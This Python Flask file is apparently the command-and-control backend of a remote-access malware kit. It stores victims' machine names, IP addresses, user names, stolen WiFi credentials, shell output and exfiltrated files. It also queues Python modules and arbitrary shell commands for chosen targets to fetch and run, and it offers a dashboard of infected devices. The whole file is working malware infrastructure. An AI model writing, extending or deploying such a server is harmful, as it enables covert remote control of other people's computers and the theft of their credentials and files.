from flask import Flask,request,render_template,session,url_for,redirect
from datetime import timedelta
from werkzeug.utils import secure_filename
from urfunc.jsonhelp import fjson 
import os, json
from pprint import pprint
import requests
app = Flask(__name__)
app.secret_key = "hello"
filename = "device-list.json"
path = "templates/"
handlej = fjson(path,filename)


#######################################################################################################
################################            SENDING SECTION       ####################################
########################################################################################################
@app.route('/index')
@app.route('/', methods=['GET', 'POST'])
def welcome():
    if request.method == "POST":
        f = open('templates/mainuser.json')
        data = json.load(f)
        query = request.form
        username = query['Username']
        password = query['Password']
        IDS = handlej.data['device']
        if data['username'] == username and data['password'] == password:
            session.permanent = True
            session["username"] = username
            return render_template('index.html',len = len(IDS),IDS = IDS,enumerate=enumerate)
        else:
            return render_template("login.html")
    else:
        if "username" in session:
            IDS = handlej.data['device']
            return render_template('index.html',len = len(IDS),IDS = IDS,enumerate=enumerate)
        return render_template("login.html")

@app.route("/logout")
def logout():
    session.pop("username", None)
    return render_template("login.html")

@app.route('/controlpanel/<name>', methods=['GET', 'POST'])
def controlpanel(name):
    name = name.split(":")
    ID = name[0]
    opt = name[1]
    if opt == "1":
        data = handlej.data['device'][ID]
        return render_template('controlpanel.html',ID=ID,opt=opt,data=data)
    if opt == "2":
        data = handlej.data['device'][ID]
        ndata = []
        if "WIFI" in data:
            data = data['WIFI']
            j = 1
            for i in range(0,len(data),2):
                ndata.append([data[i],data[j]])
                j+=2

        else:
            data = []
        return render_template('controlpanel.html',ID=ID,opt=opt,data=ndata,enumerate=enumerate)
    if opt == "3":
        return render_template('controlpanel.html',ID=ID,opt=opt)

    if opt == "5":
        data = handlej.data['device'][ID]
        if "SHELL" in data:
            data = data["SHELL"]
        else:
            data = "Reload"
        return render_template('controlpanel.html',ID=ID,opt=opt,data=data)
    return render_template('controlpanel.html',ID=ID,opt=opt)
        
@app.route("/confirmattack/<ID>",methods=['GET','POST'])
def command(ID):
    target = ID
    return redirect(url_for("controlpanel",name=target+":1"))

@app.route('/clear', methods=['GET', 'POST'])
def clear():
    handlej.data['device'] = {}
    handlej.writefile()
    return redirect(url_for("welcome"))



#######################################################################################################
################################            RECIEVING SECTION       ####################################
########################################################################################################
@app.route('/ReadForm', methods=['POST','GET'])
def read_form():
    if request.method == "POST":
    # Get the form data as Python ImmutableDict datatype 
        data = request.form
        ID = data['ID']
        PC = data['pc']
        IP = data['ip']
        USER = data['user']
        VIRUSTOTAL = data['VirusTotal']
        infoj = {'ID':ID,'PC':PC,'IP':IP,'USER':USER,'VIRUSTOTAL':VIRUSTOTAL}
        handlej.checkidandwrite(ID=ID,info=infoj)
        pprint(handlej.data)
        if "wifi" in data:
            wifidata = request.form.getlist('wifi')
            handlej.wifi(ID,wifidata)
        if "shell" in data:
            infoj["SHELL"] = data["shell"]
            handlej.checkidandwrite(ID,infoj)
        return infoj
    else:
        return handlej.data['sendcommand']

@app.route('/file', methods=['POST'])
def upload_image():
    data = request.form
    ID = data['ID']
    Type = data['Type']
    if 'file' not in request.files:
        print('false')
        return 'false'
    file = request.files['file']
    if file.filename == '':
        print('false')
        return 'false'
    if file:
        filename = secure_filename(file.filename)
        print(filename)
        file.save("static/storage/"+ID+"/"+Type+"/"+filename)
        #print('upload_image filename: ' + filename)
        return 'TRUE'

@app.route("/sendcommand",methods=['POST'])
def sendcmd():
    data = request.form
    print(data)
    target = data['target']
    Type = data['type']
    code = open(f"modules/{Type}.py").read()
    if Type == "Shell":
        command = data['command']
        typa = Type+"||:||"+code+"||:||"+command
    else:
        typa = Type+"||:||"+code
    handlej.sendcommand(target,typa)
    return "true"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=105,debug=True)